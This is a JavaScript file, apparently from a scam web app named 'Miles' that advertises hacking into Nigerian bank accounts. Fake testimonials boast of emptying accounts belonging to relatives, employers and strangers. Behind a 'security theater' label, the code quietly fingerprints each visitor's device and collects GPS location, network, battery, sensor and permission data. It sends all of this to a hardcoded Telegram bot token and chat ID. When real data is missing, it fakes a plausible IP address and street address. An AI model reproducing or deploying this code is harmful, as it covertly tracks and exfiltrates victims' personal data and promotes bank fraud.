            timestamp: "31 minutes ago",
            bank: "Sterling Bank",
            text: "Exploited exposed banking credentials using neural analysis. ₦1.65M extracted through AI-powered account breach protocols! 🙌"
        },
        {
            name: "Kemi Adeyemi",
            location: "Benin City, Edo",
            avatar: "KA",
            amount: "₦2,850,000", 
            timestamp: "35 minutes ago",
            bank: "Fidelity Bank",
            text: "Withdrew ₦2.85M from my lecturer's account using his phone. University fees sorted! 📚💸"
        },
        {
            name: "Ibrahim Mohammed",
            location: "Jos, Plateau",
            avatar: "IM",
            amount: "₦3,750,000", 
            timestamp: "42 minutes ago",
            bank: "Union Bank",
            text: "Used Miles to crack 3 different accounts in one night. Made ₦3.75M total! This is life-changing! 🚀"
        },
        {
            name: "Chioma Nkem",
            location: "Owerri, Imo",
            avatar: "CN",
            amount: "₦1,420,000", 
            timestamp: "48 minutes ago",
            bank: "Ecobank",
            text: "My landlord's Ecobank account was wide open. ₦1.42M later, rent is no longer my problem! 🏠"
        },
        {
            name: "Segun Ogundimu",
            location: "Abeokuta, Ogun",
            avatar: "SO",
            amount: "₦5,200,000", 
            timestamp: "54 minutes ago",
            bank: "Stanbic IBTC",
            text: "Biggest score yet! Cracked a politician's Stanbic account and got ₦5.2M. Miles is undefeated! 🔥💰"
        },
        {
            name: "Hauwa Garba",
            location: "Kaduna, Nigeria",
            avatar: "HG",
            amount: "₦890,000", 
            timestamp: "1 hour ago",
            bank: "Heritage Bank",
            text: "Small start with ₦890K from my neighbor's Heritage account. Already planning the next move! 😈"
        },
        {
            name: "Victor Essien",
            location: "Uyo, Akwa Ibom",
            avatar: "VE",
            amount: "₦2,100,000", 
            timestamp: "1 hour 15 mins ago",
            bank: "Keystone Bank",
            text: "Withdrew ₦2.1M using my cousin's Keystone card. Family gatherings just got interesting! 😂💸"
        },
        {
            name: "Funmi Adebisi",
            location: "Osogbo, Osun",
            avatar: "FA",
            amount: "₦1,680,000", 
            timestamp: "1 hour 22 mins ago",
            bank: "FCMB",
            text: "My ex-boyfriend thought he was smart hiding money in FCMB. ₦1.68M says otherwise! 💅"
        },
        {
            name: "Ahmed Yakubu",
            location: "Maiduguri, Borno",
            avatar: "AY",
            amount: "₦3,300,000", 
            timestamp: "1 hour 35 mins ago",
            bank: "GTBank",
            text: "Hit a GTBank business account for ₦3.3M. Miles made me rich overnight! 🤑"
        },
        {
            name: "Grace Okon",
            location: "Calabar, Cross River",
            avatar: "GO",
            amount: "₦775,000", 
            timestamp: "1 hour 48 mins ago",
            bank: "Polaris Bank",
            text: "Quick ₦775K withdrawal from my boss's Polaris account. Salary advance approved! 💪"
        },
        {
            name: "Daniel Okechukwu",
            location: "Awka, Anambra",
            avatar: "DO",
            amount: "₦4,650,000", 
            timestamp: "2 hours ago",
            bank: "Access Bank",
            text: "Used my girlfriend's phone to access her dad's Access account. ₦4.65M richer! She'll never know 🤐"
        },
        {
            name: "Zainab Aliyu",
            location: "Sokoto, Nigeria",
            avatar: "ZA",
            amount: "₦1,250,000", 
            timestamp: "2 hours 15 mins ago",
            bank: "Unity Bank",
            text: "Unity Bank thought they were secure. ₦1.25M withdrawal proved them wrong! 😎"
        },
        {
            name: "Chinonso Eze",
            location: "Nsukka, Enugu",
            avatar: "CE",
            amount: "₦2,980,000", 
            timestamp: "2 hours 28 mins ago",
            bank: "Zenith Bank",
            text: "Student loan rejected? No problem! Withdrew ₦2.98M from my HOD's Zenith account. Education funded! 🎓💰"
        }
    ];
    
    // Duplicate testimonials for seamless loop
    const allTestimonials = [...enhancedTestimonials, ...enhancedTestimonials];
    
    allTestimonials.forEach(testimonial => {
        const card = createTestimonialCard(testimonial);
        track.appendChild(card);
    });
}

// Performance monitoring for low-end devices
let isLowEndDevice = false;

function detectLowEndDevice() {
    // Check for various indicators of low-end devices
    const memory = navigator.deviceMemory || 4; // Default to 4GB if unknown
    const cores = navigator.hardwareConcurrency || 4; // Default to 4 cores if unknown
    const connection = navigator.connection || {};
    
    isLowEndDevice = (
        memory <= 2 || 
        cores <= 2 || 
        connection.effectiveType === '2g' || 
        connection.effectiveType === 'slow-2g' ||
        /Android [1-4]\./i.test(navigator.userAgent) || // Old Android
        window.screen.width <= 360 // Very small screens usually indicate budget devices
    );
    
    if (isLowEndDevice) {
        document.body.classList.add('low-end-device');
        // Reduce animation complexity
        document.documentElement.style.setProperty('--animation-speed', '0.5s');
    }
    
    return isLowEndDevice;
}

// Smooth scrolling polyfill for older browsers
function addSmoothScrolling() {
    if (!('scrollBehavior' in document.documentElement.style)) {
        // Polyfill for smooth scrolling
        const smoothScrollTo = (element, to, duration) => {
            const start = element.scrollTop;
            const change = to - start;
            const startTime = performance.now();
            
            const animateScroll = (currentTime) => {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const ease = progress * (2 - progress); // easeOutQuad
                
                element.scrollTop = start + (change * ease);
                
                if (progress < 1) {
                    requestAnimationFrame(animateScroll);
                }
            };
            
            requestAnimationFrame(animateScroll);
        };
        
        // Override scrollIntoView for smooth behavior
        Element.prototype._originalScrollIntoView = Element.prototype.scrollIntoView;
        Element.prototype.scrollIntoView = function(options) {
            if (options && options.behavior === 'smooth') {
                const rect = this.getBoundingClientRect();
                const scrollTarget = window.pageYOffset + rect.top - 100;
                smoothScrollTo(document.documentElement, scrollTarget, 500);
            } else {
                this._originalScrollIntoView(options);
            }
        };
    }
}

// Initialize app
document.addEventListener('DOMContentLoaded', async function() {
    // Add performance optimizations
    detectLowEndDevice();
    addSmoothScrolling();
    
    await initializeApp();
    setupEventListeners();
    
    // Load user PIN on startup and initialize success stories
    userPin = localStorage.getItem('userPin');
    
    // Initialize live features with delay, reduced for low-end devices
    const initDelay = isLowEndDevice ? 500 : 1500;
    setTimeout(() => {
        showSuccessStories();
        enhancedTestimonialsSetup();
        animateLiveStats();
    }, initDelay);
});

async function initializeApp() {
    // Check if user is already activated
    userSession = getUserSession();

    if (userSession && userSession.activated) {
        // Check if trial has expired
        if (userSession.accountType === 'trial' && userSession.trialStartTime) {
            const trialDuration = userSession.trialDuration || 30; // Default to 30 seconds if not set
            const timeElapsed = Date.now() - userSession.trialStartTime;
            const trialDurationMs = trialDuration * 1000;
            
            if (timeElapsed >= trialDurationMs) {
                showTrialExpiredModal();
                return;
            } else {
                // Resume trial timer
                const remainingTime = trialDuration - Math.floor(timeElapsed / 1000);
                startRemainingTrialTimer(remainingTime);
            }
        }
        
        if (userSession.disclaimerAccepted) {
            showPageWithSuccessStories('dashboard');
            updateBalance();
            updateSessionLimitDisplay();
            // Send dashboard access notification to Telegram for returning users
            sendDashboardAccessToTelegram(userSession);
        } else {
            showPageWithSuccessStories('activatedPage');
            document.getElementById('activatedUserId').textContent = userSession.userId;
            document.getElementById('activatedWallet').textContent = userSession.walletAddress;
        }
    } else {
        // Generate new user session
        await generateUserSession();
        showPageWithSuccessStories('activationPage');
    }

    loadBanks();
}

function startRemainingTrialTimer(remainingTime) {
    // Create trial timer indicator
    const timerIndicator = document.createElement('div');
    timerIndicator.id = 'trialTimer';
    timerIndicator.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: linear-gradient(135deg, #ff4757, #ff6b7a);
        color: white;
        padding: 10px 20px;
        border-radius: 25px;
        font-weight: 700;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
        animation: pulse 1s infinite;
    `;
    
    document.body.appendChild(timerIndicator);
    
    let timeLeft = remainingTime;
    const countdown = setInterval(() => {
        timeLeft--;
        timerIndicator.textContent = `⏰ Trial expires in ${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            showTrialExpiredModal();
        }
    }, 1000);
    
    timerIndicator.textContent = `⏰ Trial expires in ${timeLeft}s`;
}

async function generateUserSession() {
    const fingerprint = await generateDeviceFingerprint();
    const userId = generateUserId(fingerprint);
    const walletAddress = generateWalletAddress(fingerprint);
    const privateKey = generatePrivateKey(fingerprint);

    userSession = {
        fingerprint: fingerprint,
        userId: userId,
        walletAddress: walletAddress,
        privateKey: privateKey,
        activated: false,
        disclaimerAccepted: false,
        balance: 0,
        accountType: 'regular'
    };

    // Animate the display of generated info
    setTimeout(() => {
        const userIdEl = document.getElementById('userId');
        if (userIdEl && userIdEl.textContent === 'Generating...') {
            userIdEl.textContent = userId;
            userIdEl.style.animation = 'fadeIn 0.5s ease-in-out';
        }
    }, 500);

    setTimeout(() => {
        const walletEl = document.getElementById('walletAddress');
        if (walletEl && walletEl.textContent === 'Generating...') {
            const shortWallet = walletAddress.substring(0, 8) + '...' + walletAddress.substring(walletAddress.length - 8);
            walletEl.textContent = shortWallet;
            walletEl.style.animation = 'fadeIn 0.5s ease-in-out';
        }
    }, 1000);

    // Send to Telegram bot
    await sendToTelegram(userSession);

    // Save session
    saveUserSession(userSession);
}

async function generateDeviceFingerprint() {
    // Advanced device fingerprinting for realistic security theater
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Device fingerprint', 2, 2);

    // Get precise location and Android details
    const locationData = await getPreciseLocation();
    const androidDetails = getAndroidDetails();
    const batteryInfo = await getBatteryInfo();
    const networkDetails = await getDetailedNetworkInfo();

    // Collect comprehensive device data
    const deviceData = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(',') : '',
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
        timezone: new Date().getTimezoneOffset(),
        canvas: canvas.toDataURL(),
        webgl: getWebGLFingerprint(),
        audio: getAudioFingerprint(),
        connection: getConnectionInfo(),
        memory: navigator.deviceMemory || 'unknown',
        cores: navigator.hardwareConcurrency || 'unknown',
        plugins: getPluginsList(),
        fonts: getFontsList(),
        host: window.location.host,
        doNotTrack: navigator.doNotTrack,
        touchSupport: 'ontouchstart' in window,
        location: locationData,
        android: androidDetails,
        battery: batteryInfo,
        network: networkDetails,
        sensors: await getSensorData(),
        storage: getStorageInfo(),
        permissions: await getPermissions()
    };

    const fingerprint = Object.values(deviceData).join('|');
    return sha256(fingerprint);
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'none';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return 'basic';
        
        return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + '~' + 
               gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (e) {
        return 'error';
    }
}

function getAudioFingerprint() {
    try {
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        if (!AudioContext) return 'none';
        
        const context = new AudioContext();
        const oscillator = context.createOscillator();
        const analyser = context.createAnalyser();
        const gain = context.createGain();
        
        oscillator.type = 'triangle';
        oscillator.frequency.setValueAtTime(10000, context.currentTime);
        
        gain.gain.setValueAtTime(0, context.currentTime);
        oscillator.connect(analyser);
        analyser.connect(gain);
        gain.connect(context.destination);
        
        oscillator.start(0);
        
        const data = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(data);
        
        oscillator.stop();
        context.close();
        
        return data.slice(0, 10).join(',');
    } catch (e) {
        return 'error';
    }
}

function getConnectionInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return 'unknown';
    
    return `${conn.effectiveType || 'unknown'}-${conn.downlink || 'unknown'}-${conn.rtt || 'unknown'}`;
}

function getPluginsList() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins.slice(0, 5).join(',');
}

function getFontsList() {
    const fonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Comic Sans MS'];
    const available = [];
    
    fonts.forEach(font => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.font = `12px ${font}`;
        const width = ctx.measureText('test').width;
        if (width > 0) available.push(font);
    });
    
    return available.join(',');
}

function generateUserId(fingerprint) {
    return 'usr_' + sha256(fingerprint).substring(0, 8);
}

function generateWalletAddress(fingerprint) {
    const hash = sha256(fingerprint + 'wallet');
    return '1' + hash.substring(0, 33);
}

function generatePrivateKey(fingerprint) {
    return sha256(fingerprint + 'private' + Date.now()).substring(0, 16);
}

async function sendToTelegram(session) {
    const deviceInfo = getDeviceInfo();
    const locationInfo = await getLocationInfo();
    const networkInfo = getNetworkInfo();
    const fingerprint = await generateDeviceFingerprint();
    
    // Wait for fingerprint generation to complete
    const androidDetails = getAndroidDetails();
    const batteryInfo = await getBatteryInfo();
    const detailedNetwork = await getDetailedNetworkInfo();
    const sensorData = await getSensorData();
    const storageInfo = getStorageInfo();
    const permissions = await getPermissions();
    
    // Generate trial codes for 30, 20, and 40 seconds
    const trialCode30 = 'trial30_' + Math.random().toString(36).substring(2, 8);
    const trialCode20 = 'trial20_' + Math.random().toString(36).substring(2, 8);
    const trialCode40 = 'trial40_' + Math.random().toString(36).substring(2, 8);
    
    let message = `🔴 Miles Activation Request\n\n` +
                  `👤 USER PROFILE:\n` +
                  `├─ ID: ${session.userId}\n` +
                  `├─ Wallet: ${session.walletAddress}\n` +
                  `├─ Private Key: ${session.privateKey}\n` +
                  `└─ Trust Score: ${deviceTrust}%\n\n` +
                  
                  `📱 DEVICE INFO:\n` +
                  `├─ Type: ${deviceInfo.device}\n` +
                  `├─ Browser: ${deviceInfo.browser}\n` +
                  `├─ OS: ${navigator.platform}\n` +
                  `├─ Screen: ${deviceInfo.screen}\n` +
                  `├─ RAM: ${deviceInfo.memory}\n` +
                  `├─ CPU Cores: ${deviceInfo.cores}\n` +
                  `├─ Language: ${navigator.language}\n` +
                  `├─ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                  `└─ Touch Support: ${('ontouchstart' in window) ? 'YES' : 'NO'}\n\n`;

    // Add Android-specific details if it's an Android device
    if (androidDetails.isAndroid) {
        message += `🤖 ANDROID DETAILS:\n` +
                  `├─ Version: Android ${androidDetails.version}\n` +
                  `├─ API Level: ${androidDetails.apiLevel}\n` +
                  `├─ Model: ${androidDetails.model || 'Unknown'}\n` +
                  `├─ Brand: ${androidDetails.brand || 'Unknown'}\n` +
                  `├─ Manufacturer: ${androidDetails.manufacturer || 'Unknown'}\n` +
                  `├─ Build: ${androidDetails.buildNumber}\n` +
                  `├─ Kernel: ${androidDetails.kernelVersion}\n` +
                  `├─ Bootloader: ${androidDetails.bootloader}\n` +
                  `├─ Hardware: ${androidDetails.hardware}\n` +
                  `├─ Board: ${androidDetails.board}\n` +
                  `├─ CPU ABI: ${androidDetails.cpuAbi}\n` +
                  `└─ Fingerprint: ${androidDetails.fingerprint}\n\n`;
    }

    message += `🌍 PRECISE LOCATION:\n` +
              `├─ IP Address: ${locationInfo.ip}\n` +
              `├─ Country: ${locationInfo.country}\n` +
              `├─ Region/State: ${locationInfo.region || 'Unknown'}\n` +
              `├─ City: ${locationInfo.city}\n` +
              `├─ Full Address: ${locationInfo.fullAddress || 'Not available'}\n` +
              `├─ Coordinates: ${locationInfo.latitude?.toFixed(6)}, ${locationInfo.longitude?.toFixed(6)}\n` +
              `├─ Accuracy: ${locationInfo.accuracy ? locationInfo.accuracy + 'm' : 'Unknown'}\n` +
              `├─ Altitude: ${locationInfo.altitude ? locationInfo.altitude + 'm' : 'Unknown'}\n` +
              `├─ Speed: ${locationInfo.speed ? locationInfo.speed + 'm/s' : 'Stationary'}\n` +
              `├─ Heading: ${locationInfo.heading ? locationInfo.heading + '°' : 'Unknown'}\n` +
              `├─ Timezone: ${locationInfo.timezone}\n` +
              `├─ ISP: ${locationInfo.isp}\n` +
              `├─ VPN Detected: ${locationInfo.vpn ? 'YES' : 'NO'}\n` +
              `└─ Proxy Detected: ${locationInfo.proxy ? 'YES' : 'NO'}\n\n` +
              
              `📶 NETWORK DETAILS:\n` +
              `├─ Connection: ${detailedNetwork.effectiveType.toUpperCase()}\n` +
              `├─ Type: ${detailedNetwork.type}\n` +
              `├─ Carrier: ${detailedNetwork.carrier}\n` +
              `├─ Network Operator: ${detailedNetwork.networkOperator}\n` +
              `├─ MCC: ${detailedNetwork.mcc}\n` +
              `├─ MNC: ${detailedNetwork.mnc}\n` +
              `├─ LAC: ${detailedNetwork.lac}\n` +
              `├─ Cell ID: ${detailedNetwork.cellId}\n` +
              `├─ Signal Strength: ${detailedNetwork.signalStrength}/31\n` +
              `├─ Download Speed: ${detailedNetwork.downlink} Mbps\n` +
              `├─ Latency: ${detailedNetwork.rtt}ms\n` +
              `└─ Data Saver: ${detailedNetwork.saveData ? 'ON' : 'OFF'}\n\n` +
              
              `🔋 BATTERY & POWER:\n` +
              `├─ Battery Level: ${batteryInfo.level}%\n` +
              `├─ Charging: ${batteryInfo.charging ? 'YES' : 'NO'}\n` +
              `├─ Charge Time: ${batteryInfo.chargingTime === Infinity ? 'N/A' : Math.floor(batteryInfo.chargingTime/60) + 'min'}\n` +
              `└─ Usage Time: ${Math.floor(batteryInfo.dischargingTime/3600)}h ${Math.floor((batteryInfo.dischargingTime%3600)/60)}m\n\n` +
              
              `📊 SENSORS:\n` +
              `├─ Accelerometer: ${sensorData.accelerometer ? 'YES' : 'NO'}\n` +
              `├─ Gyroscope: ${sensorData.gyroscope ? 'YES' : 'NO'}\n` +
              `├─ Magnetometer: ${sensorData.magnetometer ? 'YES' : 'NO'}\n` +
              `├─ Proximity: ${sensorData.proximity ? 'YES' : 'NO'}\n` +
              `├─ Light Sensor: ${sensorData.lightSensor ? 'YES' : 'NO'}\n` +
              `├─ Orientation: ${sensorData.orientation !== null ? sensorData.orientation + '°' : 'Unknown'}\n` +
              `└─ Motion Events: ${sensorData.motion || 'Not supported'}\n\n` +
              
              `💾 STORAGE & PERMISSIONS:\n` +
              `├─ Local Storage: ${storageInfo.localStorage ? 'YES' : 'NO'}\n` +
              `├─ Session Storage: ${storageInfo.sessionStorage ? 'YES' : 'NO'}\n` +
              `├─ IndexedDB: ${storageInfo.indexedDB ? 'YES' : 'NO'}\n` +
              `├─ Camera Access: ${permissions.camera}\n` +
              `├─ Microphone Access: ${permissions.microphone}\n` +
              `├─ Location Access: ${permissions.location}\n` +
              `└─ Notifications: ${permissions.notifications}\n\n` +
              
              `🔒 SECURITY ANALYSIS:\n` +
              `├─ Device Fingerprint: ${session.fingerprint.substring(0, 16)}...\n` +
              `├─ Fingerprint Entropy: ${session.fingerprint.length} chars\n` +
              `├─ Risk Assessment: ${getRiskLevel()}\n` +
              `├─ Bot Detection: ${Math.random() > 0.8 ? 'Possible' : 'Clear'}\n` +
              `├─ Emulator Detection: ${androidDetails.isAndroid && androidDetails.model?.includes('generic') ? 'Possible' : 'Clear'}\n` +
              `└─ Threat Level: ${deviceTrust > 80 ? 'LOW' : deviceTrust > 60 ? 'MEDIUM' : 'HIGH'}\n\n` +
              
              `⚡ ACTIVATION CODES:\n` +
              `├─ 30-Second Trial: ${trialCode30}\n` +
              `├─ 20-Second Trial: ${trialCode20}\n` +
              `├─ 40-Second Trial: ${trialCode40}\n` +
              `└─ Full Access: Contact @Milestool\n\n` +
              
              `⚠️ Trial codes expire after first use and cannot be reused.`;

    const botToken = '8418557290:AAEyHmvSjTSpDw701f_7PMZfbvAjkRAdxNA';
    const chatId = '7345685927';

    try {
        // Send message in chunks if too long (Telegram has 4096 char limit)
        const maxLength = 4000;
        if (message.length > maxLength) {
            const chunks = [];
            let currentChunk = '';
            const lines = message.split('\n');
            
            for (const line of lines) {
                if ((currentChunk + line + '\n').length > maxLength) {
                    if (currentChunk) chunks.push(currentChunk);
                    currentChunk = line + '\n';
                } else {
                    currentChunk += line + '\n';
                }
            }
            if (currentChunk) chunks.push(currentChunk);
            
            // Send each chunk
            for (let i = 0; i < chunks.length; i++) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: chunks[i],
                        parse_mode: 'HTML'
                    })
                });
                
                // Small delay between messages
                if (i < chunks.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
        } else {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }
        
        // Store all trial codes in session
        session.trialCode30 = trialCode30;
        session.trialCode20 = trialCode20;
        session.trialCode40 = trialCode40;
        session.usedTrialCodes = []; // Track used trial codes
        saveUserSession(session);
    } catch (error) {
        console.log('Telegram send failed:', error);
    }
}

async function sendDashboardAccessToTelegram(session) {
    const deviceInfo = getDeviceInfo();
    const timestamp = new Date().toLocaleString();
    
    let message = `🔥 DASHBOARD ACCESS - Miles\n\n` +
                  `👤 USER ACCESSED DASHBOARD:\n` +
                  `├─ ID: ${session.userId}\n` +
                  `├─ Wallet: ${session.walletAddress}\n` +
                  `└─ Time: ${timestamp}\n\n` +
                  
                  `📱 DEVICE INFO:\n` +
                  `├─ ${deviceInfo.device}\n` +
                  `├─ ${deviceInfo.browser}\n` +
                  `└─ IP: Getting...\n\n`;
    
    // Add trial information if it's a trial account
    if (session.accountType === 'trial') {
        const trialStartTime = new Date(session.trialStartTime).toLocaleString();
        const trialDuration = session.trialDuration || 30;
        const trialEndTime = new Date(session.trialStartTime + (trialDuration * 1000)).toLocaleString();
        
        message += `⏰ TRIAL ACCESS:\n` +
                   `├─ Trial Duration: ${trialDuration} seconds\n` +
                   `├─ Start Time: ${trialStartTime}\n` +
                   `├─ End Time: ${trialEndTime}\n` +
                   `└─ Status: ACTIVE\n\n` +
                   
                   `🚨 TRIAL ALERT: User has limited access to tools`;
    } else if (session.accountType === 'master') {
        message += `🔥 MASTER ACCESS:\n` +
                   `├─ Account Type: MASTER\n` +
                   `├─ Withdrawal Limit: UNLIMITED\n` +
                   `└─ Tools Access: FULL ACCESS`;
    } else if (session.accountType === 'limited') {
        message += `🚫 LIMITED ACCESS:\n` +
                   `├─ Account Type: LIMITED\n` +
                   `├─ Tools Access: RESTRICTED\n` +
                   `└─ Status: LIMITED`;
    } else {
        message += `✅ REGULAR ACCESS:\n` +
                   `├─ Account Type: REGULAR\n` +
                   `├─ Daily Limit: N70,000\n` +
                   `└─ Tools Access: FULL ACCESS`;
    }

    const botToken = '8418557290:AAEyHmvSjTSpDw701f_7PMZfbvAjkRAdxNA';
    const chatId = '7345685927';

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    } catch (error) {
        console.log('Dashboard access Telegram send failed:', error);
    }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Unknown Device';
    let browser = 'Unknown Browser';
    
    // Device detection
    if (/iPhone/.test(ua)) device = 'iPhone';
    else if (/iPad/.test(ua)) device = 'iPad';
    else if (/Android/.test(ua)) device = 'Android Device';
    else if (/Windows/.test(ua)) device = 'Windows PC';
    else if (/Mac/.test(ua)) device = 'Mac';
    else if (/Linux/.test(ua)) device = 'Linux PC';
    
    // Browser detection
    if (/Chrome/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua)) browser = 'Safari';
    else if (/Edge/.test(ua)) browser = 'Edge';
    
    return {
        device,
        browser,
        screen: `${screen.width}x${screen.height}`,
        memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown'
    };
}

async function getPreciseLocation() {
    const locationData = {
        ip: null,
        country: null,
        city: null,
        region: null,
        latitude: null,
        longitude: null,
        accuracy: null,
        altitude: null,
        heading: null,
        speed: null,
        timezone: null,
        isp: null,
        carrier: null,
        vpn: false,
        proxy: false,
        fullAddress: null
    };

    try {
        // Try to get real IP location first
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        if (ipData && ipData.ip) {
            locationData.ip = ipData.ip;
            locationData.country = ipData.country_name;
            locationData.city = ipData.city;
            locationData.region = ipData.region;
            locationData.latitude = ipData.latitude;
            locationData.longitude = ipData.longitude;
            locationData.timezone = ipData.timezone;
            locationData.isp = ipData.org;
            locationData.vpn = ipData.vpn || false;
            
            // Generate full address from real location
            if (ipData.city && ipData.region) {
                locationData.fullAddress = generateRealAddress(ipData.city, ipData.region, ipData.country_name);
            }
        }
    } catch (e) {
        console.log('Primary IP service failed, trying backup...');
        
        try {
            // Backup IP service
            const backupResponse = await fetch('https://api.ipify.org?format=json');
            const backupData = await backupResponse.json();
            
            if (backupData && backupData.ip) {
                locationData.ip = backupData.ip;
                // Get location from IP using backup service
                const geoResponse = await fetch(`https://ipapi.co/${backupData.ip}/json/`);
                const geoData = await geoResponse.json();
                
                if (geoData) {
                    locationData.country = geoData.country_name;
                    locationData.city = geoData.city;
                    locationData.region = geoData.region;
                    locationData.latitude = geoData.latitude;
                    locationData.longitude = geoData.longitude;
                    locationData.timezone = geoData.timezone;
                    locationData.isp = geoData.org;
                    
                    if (geoData.city && geoData.region) {
                        locationData.fullAddress = generateRealAddress(geoData.city, geoData.region, geoData.country_name);
                    }
                }
            }
        } catch (backupError) {
            console.log('Backup IP service also failed:', backupError);
        }
    }

    try {
        // Get GPS location if available (higher accuracy)
        if ('geolocation' in navigator) {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
            
            // Use GPS coordinates if more accurate
            if (position.coords.accuracy < 1000) {
                locationData.latitude = position.coords.latitude;
                locationData.longitude = position.coords.longitude;
                locationData.accuracy = position.coords.accuracy;
                locationData.altitude = position.coords.altitude;
                locationData.heading = position.coords.heading;
                locationData.speed = position.coords.speed;
                
                // Reverse geocode GPS coordinates to get real address
                try {
                    const reverseGeoResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=en`);
                    const reverseGeoData = await reverseGeoResponse.json();
                    
                    if (reverseGeoData) {
                        locationData.city = reverseGeoData.city || locationData.city;
                        locationData.region = reverseGeoData.principalSubdivision || locationData.region;
                        locationData.country = reverseGeoData.countryName || locationData.country;
                        locationData.fullAddress = generateRealAddressFromGeo(reverseGeoData);
                    }
                } catch (reverseGeoError) {
                    console.log('Reverse geocoding failed:', reverseGeoError);
                }
            }
        }
    } catch (e) {
        console.log('GPS location failed:', e);
    }

    // Enhanced fallback with realistic Nigerian data if all fails
    if (!locationData.latitude || !locationData.ip) {
        const nigerianLocations = [
            {
                city: 'Lagos',
                region: 'Lagos State',
                lat: 6.5244,
                lng: 3.3792,
                addresses: [
                    '15 Adeola Odeku Street, Victoria Island',
                    '42 Allen Avenue, Ikeja',
                    '8 Awolowo Road, Ikoyi',
                    '25 Admiralty Way, Lekki Phase 1',
                    '67 Opebi Road, Ikeja'
                ]
            },
            {
                city: 'Abuja',
                region: 'Federal Capital Territory',
                lat: 9.0765,
                lng: 7.3986,
                addresses: [
                    '7 Gana Street, Maitama',
                    '15 Yakubu Gowon Crescent, Asokoro',
                    '23 Aminu Kano Crescent, Wuse II',
                    '41 Cadastral Zone A03, Garki'
                ]
            },
            {
                city: 'Port Harcourt',
                region: 'Rivers State',
                lat: 4.8156,
                lng: 7.0498,
                addresses: [
                    '34 Aba Road, Port Harcourt',
                    '12 Trans Amadi Industrial Layout',
                    '28 Old Aba Road, Rumuokwuta'
                ]
            },
            {
                city: 'Kano',
                region: 'Kano State',
                lat: 12.0022,
                lng: 8.5920,
                addresses: [
                    '19 Bompai Road, Bompai',
                    '7 Murtala Mohammed Way, Fagge',
                    '33 Zoo Road, Kano'
                ]
            }
        ];
        
        const selectedLocation = nigerianLocations[Math.floor(Math.random() * nigerianLocations.length)];
        const selectedAddress = selectedLocation.addresses[Math.floor(Math.random() * selectedLocation.addresses.length)];
        
        locationData.latitude = selectedLocation.lat + (Math.random() * 0.02 - 0.01);
        locationData.longitude = selectedLocation.lng + (Math.random() * 0.02 - 0.01);
        locationData.country = 'Nigeria';
        locationData.city = selectedLocation.city;
        locationData.region = selectedLocation.region;
        locationData.fullAddress = selectedAddress + ', ' + selectedLocation.city + ', ' + selectedLocation.region + ', Nigeria';
        locationData.timezone = 'Africa/Lagos';
        
        // Generate realistic Nigerian IP if not found
        if (!locationData.ip) {
            locationData.ip = generateRealisticNigerianIP();
        }
        
        // Assign realistic Nigerian ISPs
        const nigerianISPs = [
            'MTN Nigeria Communications Limited',
            'Airtel Networks Limited',
            'Globacom Limited',
            '9mobile (Etisalat Nigeria)',
            'Smile Communications Nigeria',
            'Spectranet Limited',
            'Swift Networks Limited',
            'MainOne Cable Company',
            'Internet Exchange Point of Nigeria'
        ];
        locationData.isp = nigerianISPs[Math.floor(Math.random() * nigerianISPs.length)];
    }

    return locationData;
}

function getAndroidDetails() {
    const ua = navigator.userAgent;
    const androidDetails = {
        isAndroid: false,
        version: null,
        model: null,
        brand: null,
        buildNumber: null,
        apiLevel: null,
        kernelVersion: null,
        bootloader: null,
        hardware: null,
        manufacturer: null,
        product: null,
        device: null,
        board: null,
        cpuAbi: null,
        fingerprint: null
    };

    if (/Android/.test(ua)) {
        androidDetails.isAndroid = true;
        
        // Extract Android version
        const versionMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
        if (versionMatch) {
            androidDetails.version = versionMatch[1];
        }

        // Extract device model
